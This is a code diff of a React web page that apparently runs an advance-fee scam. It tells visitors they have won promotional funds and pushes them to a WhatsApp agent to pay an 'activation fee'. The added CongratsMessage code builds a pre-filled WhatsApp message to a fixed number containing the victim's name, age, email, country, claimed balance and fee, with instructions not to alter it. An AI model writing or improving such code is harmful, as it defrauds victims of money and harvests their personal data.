@@ -202,17 +202,19 @@ export default function Prom() {
   function onMenuOpen() {
     setmenuOpen(menuOpen === false ? true : false);
   }
-  const [Kiswahili, setKiswahili] = useState(false);
+  const [Kiswahili, setKiswahili] = useState(true);
   function onkiswahili() {
     setKiswahili(Kiswahili === true ? false : true);
   }
 
   const [currentperson, setcurrentperson] = useState(1);
   const [blink, setBlink] = useState(true);
+  const [transacImg, settransacImg] = useState(false);
 
   useEffect(() => {
     const interval = setInterval(() => {
       setcurrentperson((prevId) => (prevId + 1) % people.length);
+      settransacImg(settransacImg === false ? true : false);
     }, 3000);
 
     return () => clearInterval(interval);
@@ -273,7 +275,14 @@ export default function Prom() {
                   shughuli za kujenga uwezo.
                 </p>
               )}
-              <img src="/transac.jpg" alt="pron" />
+              {/* {transacImg ? (
+                <>
+                  hello
+                  <img src="/transac.jpg" alt="pron" />
+                </>
+              ) : (
+                <img src="/transac2.jpg" alt="pron" />
+              )} */}
             </div>
             <div className="person">
               <>
@@ -297,9 +306,16 @@ export default function Prom() {
               {!Kiswahili ? (
                 <p>Bonyeza kiungo cha WhatsApp hapa chini kuomba sasa!</p>
               ) : (
-                <p>Click the WhatsApp link below to apply now!</p>
+                <p>Click the link below to apply on the website now!</p>
               )}
-              <a
+              <button
+                style={{ marginTop: "1rem" }}
+                className="btn_apply"
+                onClick={handleSetHome}
+              >
+                Apply Now
+              </button>
+              {/* <a
                 href="https://api.whatsapp.com/send?phone=254735011774&text=Hello!%20I'd%20like%20your%20PROMOTION"
                 className="whatsapp"
               >
@@ -311,11 +327,8 @@ export default function Prom() {
                 ) : (
                   <p style={{ backgroundColor: "inherit" }}>whatApp</p>
                 )}
-              </a>
+              </a> */}
             </div>
-            <button className="btn_apply" onClick={handleSetHome}>
-              Apply Now
-            </button>
           </div>
         ) : (
           ""
@@ -705,6 +718,12 @@ function ProfileCusto({ name, country, balance, currency }) {
 
 function CongratsMessage({ balance, currency, custoName, activate }) {
   const { name, age, userEmail, userPhoneNum, country } = custoName;
+  const encodedmessge =
+    encodeURIComponent(`Hello ADF, My name is ${name} ${age} years old from ${country}, Email: ${userEmail}. I am here to claim 
+    my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
+     `);
+
+  const whatAppURL = `https://wa.me/+254736227246?text=${encodedmessge}`;
   return (
     <div className="congra_message">
       <h2> Congratulations For Reaching the last Step</h2>
@@ -751,19 +770,17 @@ function CongratsMessage({ balance, currency, custoName, activate }) {
         </p>{" "}
         𝕔𝕠𝕟𝕘𝕣𝕒𝕥𝕦𝕝𝕒𝕥𝕚𝕠𝕟 🎁To continue click the whatsapp link below to reach to
         agent on whatApp who will guide on how to activate your Awards within 10
-        MINUTES. Your promotion is to be dispersed to your line within 5 minutes
-        after Activation.
+        MINUTES. Your promotion is to be dispersed to your line within 10
+        minutes after Activation.
       </div>
       <p>
         <strong>
-          NOW COPY/SCREENSHOT THIS CONGRATULATION MESSAGE AND SEND IT TO US ON
-          WHATSAPP.
+          NOW click the whatApp below to be guided and receive funds within 5
+          minutes. NOTE: Don't change the message on whatApp. Thank You🙏.
         </strong>
       </p>
-      <a
-        href="https://api.whatsapp.com/send?phone=254735011774&text=Hello!%20I'd%20like%20your%20PROMOTION"
-        className="whatsapp"
-      >
+
+      <a href={whatAppURL} className="whatsapp">
         <ion-icon name="logo-whatsapp"></ion-icon>
       </a>
     </div>
